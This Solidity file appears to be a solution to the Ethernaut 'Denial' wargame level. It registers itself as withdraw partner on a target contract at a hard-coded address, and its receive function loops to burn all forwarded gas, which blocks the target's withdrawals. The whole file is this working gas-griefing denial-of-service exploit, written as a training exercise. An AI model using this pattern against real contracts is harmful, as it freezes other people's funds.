// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "../../src/level-20/EthernautDenial.sol";

contract DenialSolution {
    Denial denial = Denial(payable(0x04C8827B6C5006e4790F46562cc3177F3CC36EB7));

    constructor() {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        for (uint256 i = 0; i < type(uint256).max; i++) {
            i += 1;
        }
    }
}
